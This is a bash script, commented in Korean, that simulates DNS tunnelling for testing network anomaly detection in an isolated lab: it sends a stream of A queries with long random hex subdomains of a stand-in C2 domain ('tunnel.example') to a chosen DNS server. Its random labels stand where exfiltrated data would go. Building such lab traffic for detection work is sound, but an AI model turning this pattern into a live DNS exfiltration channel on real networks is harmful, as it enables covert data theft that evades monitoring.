#!/bin/bash
# DNS 터널 생성기 — 네트워크 이상탐지 검증용(격리 실습망 전용, DD-020).
#
# 침해된 호스트가 C2 도메인의 긴 무작위 하위 도메인을 DNS 서버에 질의한다. 하위 도메인에
# 유출 데이터를 실어 보내는 DNS 터널링의 모사(DD-008 dns_tunnel의 실제 버전). 흔한 A 질의라
# 포트·프로토콜은 평범하고, 신호는 "질의 수가 많고 이름이 길다"에 있다. 비커닝처럼 조용한
# 유형이라, dns.log의 질의 폭증·이름 길이가 창 특징에 남는지 본다.
#
# 대상 DNS 서버는 타깃(.20)의 dnsmasq로 두고, 이 생성기는 질의자(공격자)에서 돌린다.
# dig이 필요하다(Kali에 기본 설치).
#
# 실행(질의자에서): bash lab_dns_tunnel.sh DNS_SERVER DOMAIN [COUNT] [INTERVAL]
#   예: bash lab_dns_tunnel.sh 10.10.0.20 tunnel.example 200 2
# 시각은 ~/dnstunnel-<시작 UTC>.log에 남는다.
set -uo pipefail

SERVER=${1:?DNS 서버 주소}
DOMAIN=${2:?C2 도메인}
COUNT=${3:-200}
INTERVAL=${4:-2}

command -v dig >/dev/null 2>&1 || { echo "dig이 없다(dnsutils)" >&2; exit 1; }

LOG=~/dnstunnel-$(date -u +%Y%m%dT%H%M%SZ).log
mark() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $*" | tee -a "$LOG"; }

rand_label() {   # 긴 무작위 라벨(유출 데이터 자리). openssl 없으면 /dev/urandom.
    if command -v openssl >/dev/null 2>&1; then openssl rand -hex 20
    else head -c 20 /dev/urandom | od -An -tx1 | tr -d ' \n'; fi
}

mark "dns-tunnel start -> ${SERVER} domain=${DOMAIN} count=${COUNT} interval=${INTERVAL}s"
for ((i=1; i<=COUNT; i++)); do
    name="$(rand_label).${DOMAIN}"
    dig +tries=1 +time=2 "@${SERVER}" "$name" A >/dev/null 2>&1 || true
    [ $((i % 50)) -eq 0 ] && mark "queries=$i"
    sleep "$INTERVAL"
done
mark "dns-tunnel end queries=${COUNT}"
echo "----- log: $LOG"
